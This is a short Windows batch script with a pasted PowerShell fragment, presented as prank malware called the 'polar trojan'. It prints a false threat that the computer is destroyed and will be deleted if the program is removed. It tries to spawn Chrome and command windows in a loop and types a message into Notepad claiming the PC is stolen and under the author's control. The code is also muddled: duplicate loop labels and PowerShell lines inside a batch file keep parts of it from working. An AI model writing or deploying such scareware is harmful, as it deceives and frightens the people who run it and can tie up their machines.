@echo
cls
color 0a
echo you have been hacked by the polar trojan, your computer has been destroyed with this malware, trying to remove polar will cause your system to be deleted instantly, don't try it.
:loop
Start Chrome.exe
:loop
Start cmd.exe
:loop
goto loop
# Open Notepad
Start-Process notepad
Start-Sleep -Seconds 1

# Type text in Notepad
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait("YOUR COMPUTER HAS BEEN LOGGED AND STOLEN AND IS NOW UNDER MY CONTROL, HAVE FUN GETTING YOUR PC BACK!")
